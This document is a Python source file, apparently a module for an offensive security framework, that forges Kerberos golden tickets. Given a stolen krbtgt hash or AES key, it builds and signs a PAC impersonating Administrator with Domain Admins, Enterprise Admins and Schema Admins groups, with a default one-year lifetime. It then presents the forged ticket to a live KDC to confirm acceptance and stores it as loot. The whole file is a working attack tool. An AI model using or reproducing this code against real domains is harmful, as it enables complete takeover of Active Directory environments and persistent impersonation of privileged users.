"""Golden ticket: forge a TGT with the krbtgt hash, prove it with a TGS.

dcsync gives you the krbtgt NT hash; this module turns it into a forged
TGT for any user (default: Administrator, RID 500, Domain Admins +
Enterprise Admins groups). The forge is entirely offline: a PAC claiming
the target identity is built and signed with the krbtgt key (the KDC
validates tickets against that key — possession of it IS the domain),
packed into an EncTicketPart, encrypted as a self-issued AS-REP.

VALIDATE (on by default) proves the ticket end-to-end: present it to the
KDC in a TGS-REQ for krbtgt/REALM — a service ticket coming back means
the domain's KDC accepts your forged TGT. That exchange uses the same
Heimdal-compatible TGS-REQ kerberoast vendors (Samba's KDC rejects
impacket's stock request: no authenticator cksum field).

The forged ticket lands in loot as base64 (decode into a .ccache, or
feed a later pass-the-ticket module).
"""

import datetime
import random
import string

from core.module import AuxiliaryModule
from core.options import OptAddress, OptBool, OptEnum, OptInt, OptString

try:
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue
    from impacket.dcerpc.v5.dtypes import RPC_SID, SID, NULL
    from impacket.dcerpc.v5.ndr import NDRULONG
    from impacket.dcerpc.v5.samr import (
        GROUP_MEMBERSHIP,
        SE_GROUP_ENABLED,
        SE_GROUP_ENABLED_BY_DEFAULT,
        SE_GROUP_MANDATORY,
    )
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import AS_REP, TGS_REP, EncASRepPart, EncTicketPart
    from impacket.krb5.crypto import (
        _enctype_table,
        get_kerberos_key_for_enctype,
        Key,
    )
    from impacket.krb5.pac import (
        PAC_ATTRIBUTE_INFO,
        PAC_CLIENT_INFO,
        PAC_LOGON_INFO,
        PAC_CLIENT_INFO_TYPE,
        PAC_PRIVSVR_CHECKSUM,
        PAC_REQUESTOR,
        PAC_REQUESTOR_INFO,
        PAC_ATTRIBUTES_INFO,
        PAC_SERVER_CHECKSUM,
        PAC_SIGNATURE_DATA,
        VALIDATION_INFO,
        sign_pac,
    )
    from impacket.krb5.types import KerberosTime, Principal
    # TGS validation (vendored from kerberoast.py — keep in sync)
    from impacket.krb5.asn1 import (
        AP_REQ,
        TGS_REQ,
        Authenticator,
        seq_set,
        seq_set_iter,
    )
    from impacket.krb5.crypto import Cksumtype, make_checksum
    from impacket.krb5.kerberosv5 import sendReceive
    from impacket.krb5.types import Ticket
except ImportError:
    constants = None  # console gates run() on requirements

RC4 = 23  # constants.EncryptionTypes.rc4_hmac


def _auth_cksum_type(enctype):
    return {23: Cksumtype.HMAC_MD5, 17: Cksumtype.SHA1_AES128,
            18: Cksumtype.SHA1_AES256}[enctype]


def _strip_explicit_tag(data):
    """Remove a leading [n] EXPLICIT tag wrapper from a DER value."""
    if not data or not 0xA0 <= data[0] <= 0xBF:
        return data
    if data[1] & 0x80:
        return data[2 + (data[1] & 0x7F):]
    return data[2:]


def valid_hex(text, length=32):
    """True when text is `length` hex characters (an NT hash)."""
    if len(text) != length:
        return False
    try:
        bytes.fromhex(text)
        return True
    except ValueError:
        return False


def valid_domain_sid(text):
    """True when text looks like a domain SID (S-1-5-21-x-y-z)."""
    return text.startswith("S-1-5-21-") and text.count("-") >= 6


def filetime_now():
    """Current time as a Windows FILETIME (100ns ticks since 1601)."""
    return filetime_from_datetime(datetime.datetime.now(datetime.timezone.utc))


def filetime_from_datetime(dt):
    """A datetime as a Windows FILETIME (100ns ticks since 1601)."""
    epoch = datetime.datetime(1601, 1, 1, tzinfo=datetime.timezone.utc)
    return int((dt - epoch).total_seconds() * 10_000_000)


def pad_logon_info(blob):
    """Pad a serialized VALIDATION_INFO to a multiple of 8, bumping the
    embedded ObjectBufferLength (bytes 8-11). Samba's strict NDR puller
    rejects a LOGON_INFO whose declared size isn't 8-padded ("not padded
    to 8") — Windows tolerates either."""
    pad = -len(blob) % 8
    if pad == 0:
        return blob
    blob += b"\x00" * pad
    declared = int.from_bytes(blob[8:12], "little") + pad
    return blob[:8] + declared.to_bytes(4, "little") + blob[12:]


def build_pac(domain, domain_sid, target_user, user_rid, group_rids,
              krbtgt_key_hex, etype, authtime_filetime):
    """Signed PAC claiming target_user (RID + groups) on domain.
    authtime_filetime must be the SAME whole-second FILETIME used for the
    ticket's authtime — Heimdal rejects PACs whose ClientId and authtime
    disagree ("PAC timestamp mismatch")."""
    kerbdata = VALIDATION_INFO()["Data"]

    unix_time = authtime_filetime
    kerbdata["LogonTime"]["dwLowDateTime"] = unix_time & 0xFFFFFFFF
    kerbdata["LogonTime"]["dwHighDateTime"] = unix_time >> 32
    for field in ("LogoffTime", "KickOffTime", "PasswordMustChange"):
        kerbdata[field]["dwLowDateTime"] = 0xFFFFFFFF
        kerbdata[field]["dwHighDateTime"] = 0x7FFFFFFF
    kerbdata["PasswordLastSet"]["dwLowDateTime"] = unix_time & 0xFFFFFFFF
    kerbdata["PasswordLastSet"]["dwHighDateTime"] = unix_time >> 32
    kerbdata["PasswordCanChange"]["dwLowDateTime"] = 0
    kerbdata["PasswordCanChange"]["dwHighDateTime"] = 0

    kerbdata["EffectiveName"] = target_user
    kerbdata["FullName"] = ""
    kerbdata["LogonScript"] = ""
    kerbdata["ProfilePath"] = ""
    kerbdata["HomeDirectory"] = ""
    kerbdata["HomeDirectoryDrive"] = ""
    kerbdata["LogonCount"] = 500
    kerbdata["BadPasswordCount"] = 0
    kerbdata["UserId"] = user_rid

    kerbdata["PrimaryGroupId"] = group_rids[0] if group_rids else 513
    kerbdata["GroupCount"] = len(group_rids)
    for rid in group_rids:
        membership = GROUP_MEMBERSHIP()
        group_id = NDRULONG()
        group_id["Data"] = rid
        membership["RelativeId"] = group_id
        membership["Attributes"] = (SE_GROUP_MANDATORY |
                                    SE_GROUP_ENABLED_BY_DEFAULT |
                                    SE_GROUP_ENABLED)
        kerbdata["GroupIds"].append(membership)

    kerbdata["UserFlags"] = 0
    kerbdata["UserSessionKey"] = b"\x00" * 16
    kerbdata["LogonServer"] = ""
    kerbdata["LogonDomainName"] = domain.upper()
    kerbdata["LogonDomainId"] = RPC_SID()
    kerbdata["LogonDomainId"].fromCanonical(domain_sid)
    kerbdata["LMKey"] = b"\x00" * 8
    kerbdata["UserAccountControl"] = 0x0210  # NORMAL | DONT_EXPIRE_PASSWORD
    kerbdata["SubAuthStatus"] = 0
    kerbdata["LastSuccessfulILogon"]["dwLowDateTime"] = 0
    kerbdata["LastSuccessfulILogon"]["dwHighDateTime"] = 0
    kerbdata["LastFailedILogon"]["dwLowDateTime"] = 0
    kerbdata["LastFailedILogon"]["dwHighDateTime"] = 0
    kerbdata["FailedILogonCount"] = 0
    kerbdata["Reserved3"] = 0
    kerbdata["ResourceGroupDomainSid"] = NULL
    kerbdata["ResourceGroupCount"] = 0
    kerbdata["ResourceGroupIds"] = NULL

    validation = VALIDATION_INFO()
    validation["Data"] = kerbdata

    pac_infos = {
        PAC_LOGON_INFO: pad_logon_info(
            validation.getData() + validation.getDataReferents()),
    }

    # zeroed signatures; sign_pac fills them with the krbtgt key
    server_checksum = PAC_SIGNATURE_DATA()
    priv_checksum = PAC_SIGNATURE_DATA()
    if etype == RC4:
        server_checksum["SignatureType"] = -138  # hmac-md5
        priv_checksum["SignatureType"] = -138
        server_checksum["Signature"] = b"\x00" * 16
        priv_checksum["Signature"] = b"\x00" * 16
    else:  # AES256: hmac-sha1-96
        server_checksum["SignatureType"] = 16
        priv_checksum["SignatureType"] = 16
        server_checksum["Signature"] = b"\x00" * 12
        priv_checksum["Signature"] = b"\x00" * 12
    pac_infos[PAC_SERVER_CHECKSUM] = server_checksum.getData()
    pac_infos[PAC_PRIVSVR_CHECKSUM] = priv_checksum.getData()

    client_info = PAC_CLIENT_INFO()
    client_info["Name"] = target_user.encode("utf-16-le")
    client_info["NameLength"] = len(client_info["Name"])
    client_info["ClientId"] = unix_time
    pac_infos[PAC_CLIENT_INFO_TYPE] = client_info.getData()

    attributes = PAC_ATTRIBUTE_INFO()
    attributes["FlagsLength"] = 2
    attributes["Flags"] = 1
    pac_infos[PAC_ATTRIBUTES_INFO] = attributes.getData()

    requestor = PAC_REQUESTOR()
    # PAC_REQUESTOR takes the raw Structure SID, NOT the NDR RPC_SID —
    # feeding it NDR-encoded bytes decodes as garbage (S-5-0) and the KDC
    # answers "SID mismatch between PAC and looked up client"
    requestor["UserSid"] = SID()
    requestor["UserSid"].fromCanonical(f"{domain_sid}-{user_rid}")
    pac_infos[PAC_REQUESTOR_INFO] = requestor.getData()

    order = [PAC_LOGON_INFO, PAC_CLIENT_INFO_TYPE, PAC_ATTRIBUTES_INFO,
             PAC_REQUESTOR_INFO, PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]
    if etype == RC4:
        return sign_pac(pac_infos, nt_hash=krbtgt_key_hex,
                        buffer_order=order,
                        checksum_salt=constants.KERB_NON_KERB_CKSUM_SALT)
    return sign_pac(pac_infos, aes_key=krbtgt_key_hex, buffer_order=order,
                    checksum_salt=constants.KERB_NON_KERB_CKSUM_SALT)


def forge_tgt(domain, domain_sid, target_user, user_rid, group_rids,
              krbtgt_key_hex, duration_hours=8760, kvno=2, etype=RC4):
    """(as_rep_bytes, cipher, session_key) — a self-signed golden TGT.
    kvno must match the krbtgt key version or the KDC answers
    KRB_AP_ERR_BADKEYVER (Samba provisions it as 1, Windows usually 2+).
    etype 23 = RC4 (NT hash), 18 = AES256 (dcsync's kerberos-key loot) —
    modern DCs increasingly hold NO rc4 krbtgt key at all."""
    from impacket.krb5.asn1 import AuthorizationData
    from impacket.krb5.constants import (ApplicationTagNumbers,
                                         AuthorizationDataType,
                                         PrincipalNameType,
                                         ProtocolVersionNumber, TicketFlags,
                                         encodeFlags)

    # ONE timestamp, whole-second precision, shared by the ticket's
    # authtime and the PAC's ClientId/LogonTime (see build_pac)
    now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)
    authtime_filetime = filetime_from_datetime(now)
    pac_type = build_pac(domain, domain_sid, target_user, user_rid,
                         group_rids, krbtgt_key_hex, etype, authtime_filetime)

    key_len = 16 if etype == RC4 else 32
    session_key_value = "".join(random.choice(string.ascii_letters)
                                for _ in range(key_len))
    end = now + datetime.timedelta(hours=duration_hours)

    auth_data = AuthorizationData()
    auth_data[0] = noValue
    auth_data[0]["ad-type"] = AuthorizationDataType.AD_WIN2K_PAC.value
    auth_data[0]["ad-data"] = pac_type.getData()
    encoded_auth = encoder.encode(auth_data)

    enc_ticket = EncTicketPart()
    enc_ticket["flags"] = encodeFlags([
        TicketFlags.forwardable.value, TicketFlags.proxiable.value,
        TicketFlags.renewable.value, TicketFlags.initial.value,
        TicketFlags.pre_authent.value,
    ])
    enc_ticket["key"] = noValue
    enc_ticket["key"]["keytype"] = etype
    enc_ticket["key"]["keyvalue"] = session_key_value
    enc_ticket["crealm"] = domain.upper()
    enc_ticket["cname"] = noValue
    enc_ticket["cname"]["name-type"] = PrincipalNameType.NT_PRINCIPAL.value
    enc_ticket["cname"]["name-string"] = noValue
    enc_ticket["cname"]["name-string"][0] = target_user
    enc_ticket["transited"] = noValue
    enc_ticket["transited"]["tr-type"] = 0
    enc_ticket["transited"]["contents"] = ""
    enc_ticket["authtime"] = KerberosTime.to_asn1(now)
    enc_ticket["starttime"] = KerberosTime.to_asn1(now)
    enc_ticket["endtime"] = KerberosTime.to_asn1(end)
    enc_ticket["renew-till"] = KerberosTime.to_asn1(end)
    enc_ticket["authorization-data"] = noValue
    enc_ticket["authorization-data"][0] = noValue
    enc_ticket["authorization-data"][0]["ad-type"] = \
        AuthorizationDataType.AD_IF_RELEVANT.value
    enc_ticket["authorization-data"][0]["ad-data"] = encoded_auth

    cipher = _enctype_table[etype]
    if etype == RC4:
        krbtgt_key = get_kerberos_key_for_enctype(etype, nt_hash=krbtgt_key_hex)
    else:
        krbtgt_key = get_kerberos_key_for_enctype(etype, aes256_key=krbtgt_key_hex)
    ticket_cipher_text = cipher.encrypt(krbtgt_key, 2,
                                        encoder.encode(enc_ticket), None)

    as_rep = AS_REP()
    as_rep["msg-type"] = ApplicationTagNumbers.AS_REP.value
    as_rep["pvno"] = 5
    as_rep["crealm"] = domain.upper()
    as_rep["cname"] = noValue
    as_rep["cname"]["name-type"] = PrincipalNameType.NT_PRINCIPAL.value
    as_rep["cname"]["name-string"] = noValue
    as_rep["cname"]["name-string"][0] = target_user
    as_rep["ticket"] = noValue
    as_rep["ticket"]["tkt-vno"] = ProtocolVersionNumber.pvno.value
    as_rep["ticket"]["realm"] = domain.upper()
    as_rep["ticket"]["sname"] = noValue
    as_rep["ticket"]["sname"]["name-type"] = PrincipalNameType.NT_SRV_INST.value
    as_rep["ticket"]["sname"]["name-string"] = noValue
    as_rep["ticket"]["sname"]["name-string"][0] = "krbtgt"
    as_rep["ticket"]["sname"]["name-string"][1] = domain.upper()
    as_rep["ticket"]["enc-part"] = noValue
    as_rep["ticket"]["enc-part"]["etype"] = etype
    as_rep["ticket"]["enc-part"]["kvno"] = kvno
    as_rep["ticket"]["enc-part"]["cipher"] = ticket_cipher_text

    enc_as_rep = EncASRepPart()
    enc_as_rep["key"] = noValue
    enc_as_rep["key"]["keytype"] = etype
    enc_as_rep["key"]["keyvalue"] = session_key_value
    enc_as_rep["last-req"] = noValue
    enc_as_rep["last-req"][0] = noValue
    enc_as_rep["last-req"][0]["lr-type"] = 0
    enc_as_rep["last-req"][0]["lr-value"] = KerberosTime.to_asn1(now)
    enc_as_rep["nonce"] = 123456789
    enc_as_rep["key-expiration"] = KerberosTime.to_asn1(end)
    enc_as_rep["flags"] = [i for i in enc_ticket["flags"]]
    enc_as_rep["authtime"] = KerberosTime.to_asn1(now)
    enc_as_rep["starttime"] = KerberosTime.to_asn1(now)
    enc_as_rep["endtime"] = KerberosTime.to_asn1(end)
    enc_as_rep["renew-till"] = KerberosTime.to_asn1(end)
    enc_as_rep["srealm"] = domain.upper()
    enc_as_rep["sname"] = noValue
    enc_as_rep["sname"]["name-type"] = PrincipalNameType.NT_SRV_INST.value
    enc_as_rep["sname"]["name-string"] = noValue
    enc_as_rep["sname"]["name-string"][0] = "krbtgt"
    enc_as_rep["sname"]["name-string"][1] = domain.upper()

    session_key = Key(etype, session_key_value.encode())
    reply_cipher_text = cipher.encrypt(session_key, 3,
                                       encoder.encode(enc_as_rep), None)
    as_rep["enc-part"] = noValue
    as_rep["enc-part"]["etype"] = etype
    as_rep["enc-part"]["kvno"] = 1
    as_rep["enc-part"]["cipher"] = reply_cipher_text

    return encoder.encode(as_rep), cipher, session_key


def request_tgs(spn, domain, kdc_host, tgt, cipher, session_key):
    """getKerberosTGS with the authenticator cksum Heimdal KDCs (Samba AD)
    require. Vendored from kerberoast.py — keep in sync."""
    decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
    domain = domain.upper()
    ticket = Ticket()
    ticket.from_asn1(decoded_tgt["ticket"])

    tgs_req = TGS_REQ()
    tgs_req["pvno"] = 5
    tgs_req["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    req_body = seq_set(tgs_req, "req-body")
    req_body["kdc-options"] = constants.encodeFlags([
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.canonicalize.value,
    ])
    seq_set(req_body, "sname", spn.components_to_asn1)
    req_body["realm"] = domain
    now = datetime.datetime.now(datetime.timezone.utc)
    req_body["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body["rtime"] = KerberosTime.to_asn1(now)
    req_body["nonce"] = random.getrandbits(31)
    seq_set_iter(req_body, "etype", (
        int(constants.EncryptionTypes.rc4_hmac.value),
        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
    ))
    req_body_bytes = _strip_explicit_tag(encoder.encode(req_body))

    authenticator = Authenticator()
    authenticator["authenticator-vno"] = 5
    authenticator["crealm"] = decoded_tgt["crealm"].asOctets()
    client_name = Principal()
    client_name.from_asn1(decoded_tgt, "crealm", "cname")
    seq_set(authenticator, "cname", client_name.components_to_asn1)

    def _fill_cksum(component):
        component["cksumtype"] = _auth_cksum_type(cipher.enctype)
        component["checksum"] = make_checksum(component["cksumtype"],
                                              session_key, 6, req_body_bytes)
        return component

    seq_set(authenticator, "cksum", _fill_cksum)
    authenticator["cusec"] = now.microsecond
    authenticator["ctime"] = KerberosTime.to_asn1(now)
    encoded_auth = encoder.encode(authenticator)

    ap_req = AP_REQ()
    ap_req["pvno"] = 5
    ap_req["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
    ap_req["ap-options"] = constants.encodeFlags([])
    seq_set(ap_req, "ticket", ticket.to_asn1)
    ap_req["authenticator"] = noValue
    ap_req["authenticator"]["etype"] = cipher.enctype
    ap_req["authenticator"]["cipher"] = cipher.encrypt(session_key, 7,
                                                     encoded_auth, None)
    tgs_req["padata"] = noValue
    tgs_req["padata"][0] = noValue
    tgs_req["padata"][0]["padata-type"] = int(
        constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgs_req["padata"][0]["padata-value"] = encoder.encode(ap_req)
    return sendReceive(encoder.encode(tgs_req), domain, kdc_host)


class GoldenTicket(AuxiliaryModule):
    name = "Golden Ticket (TGT forge)"
    description = """
        Forges a TGT for any user from the krbtgt NT hash (dcsync loot).
        Fully offline: builds and krbtgt-signs a PAC claiming the target
        identity, wraps it in a self-issued AS-REP. VALIDATE proves it
        against a KDC by requesting a service ticket with the forged TGT.
        The ticket lands in loot as base64.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("DOMAIN_SID", required=True,
                                   description="Domain SID (S-1-5-21-...) — from "
                                               "dcsync or LDAP"))
        self.options.add(OptEnum("KEYTYPE", ["rc4", "aes256"], default="rc4",
                                 description="Ticket encryption: rc4 (NT hash) or "
                                             "aes256 (dcsync kerberos-key loot)"))
        self.options.add(OptString("KRBTGT", default="",
                                   description="krbtgt NT hash, hex (KEYTYPE rc4)"))
        self.options.add(OptString("KRBTGT_AES", default="",
                                   description="krbtgt AES256 key, hex (KEYTYPE aes256)"))
        self.options.add(OptString("TARGET_USER", default="Administrator",
                                   description="User to impersonate"))
        self.options.add(OptInt("USER_ID", default=500,
                                description="RID to claim (500 = Administrator)"))
        self.options.add(OptString("GROUPS", default="512,519,518",
                                   description="Group RIDs to claim, comma-separated "
                                   "(512 DA, 519 EA, 518 Schema Admins, 513 Domain Users)"))
        self.options.add(OptInt("DURATION", default=8760,
                                description="Ticket lifetime, hours"))
        self.options.add(OptInt("KVNO", default=2,
                                description="krbtgt key version (Windows 2+, "
                                            "Samba lab: 1 — readable via LDAP "
                                            "msDS-KeyVersionNumber)"))
        self.options.add(OptBool("VALIDATE", default=True,
                                 description="Prove the ticket by requesting a TGS "
                                             "from RHOSTS"))
        self.options.add(OptString("RHOSTS", default="",
                                   description="KDC for validation (required when "
                                               "VALIDATE is true)"))

    def run(self):
        domain = str(self.get_option("DOMAIN"))
        domain_sid = str(self.get_option("DOMAIN_SID"))
        keytype = str(self.get_option("KEYTYPE"))
        etype = RC4 if keytype == "rc4" else 18
        krbtgt_hex = str(self.get_option(
            "KRBTGT" if etype == RC4 else "KRBTGT_AES")).strip()
        target_user = str(self.get_option("TARGET_USER"))
        user_rid = int(self.get_option("USER_ID"))
        groups = [int(g) for g in str(self.get_option("GROUPS")).split(",")
                  if g.strip()]
        duration = int(self.get_option("DURATION"))

        if not krbtgt_hex:
            self.print_error(f"KEYTYPE {keytype} needs "
                             f"{'KRBTGT' if etype == RC4 else 'KRBTGT_AES'}")
            return
        if not valid_hex(krbtgt_hex, 32 if etype == RC4 else 64):
            self.print_error(f"krbtgt key must be "
                             f"{32 if etype == RC4 else 64} hex chars")
            return
        if not valid_domain_sid(domain_sid):
            self.print_error("DOMAIN_SID must look like S-1-5-21-...")
            return

        self.print_status(f"forging {keytype} TGT for {domain.upper()}\\"
                          f"{target_user} (RID {user_rid}, groups {groups})")
        try:
            tgt, cipher, session_key = forge_tgt(
                domain, domain_sid, target_user, user_rid, groups,
                krbtgt_hex, duration, int(self.get_option("KVNO")), etype)
        except Exception as e:
            self.print_error(f"forge failed: {e}")
            return
        self.print_good(f"forged: {len(tgt)} bytes, valid {duration}h")
        self.print_debug(f"as-rep: {tgt.hex()}")

        import base64
        store = getattr(self.framework, "store", None)
        if store is not None:
            store.add_loot("ticket", f"golden {target_user} @ {domain}",
                           base64.b64encode(tgt).decode(), address="")

        if not self.get_option("VALIDATE"):
            return
        host = str(self.get_option("RHOSTS") or "").strip()
        if not host:
            self.print_error("VALIDATE is on but RHOSTS is blank")
            return
        spn = Principal(f"krbtgt/{domain.upper()}",
                        type=constants.PrincipalNameType.NT_SRV_INST.value)
        try:
            tgs = request_tgs(spn, domain, host, tgt, cipher, session_key)
        except Exception as e:
            self.print_error(f"{host}: KDC rejected the forged TGT - {e}")
            return
        decoder.decode(tgs, asn1Spec=TGS_REP())
        self.print_good(f"{host}: KDC issued a service ticket for the forged "
                        f"TGT — {target_user} is domain admin")
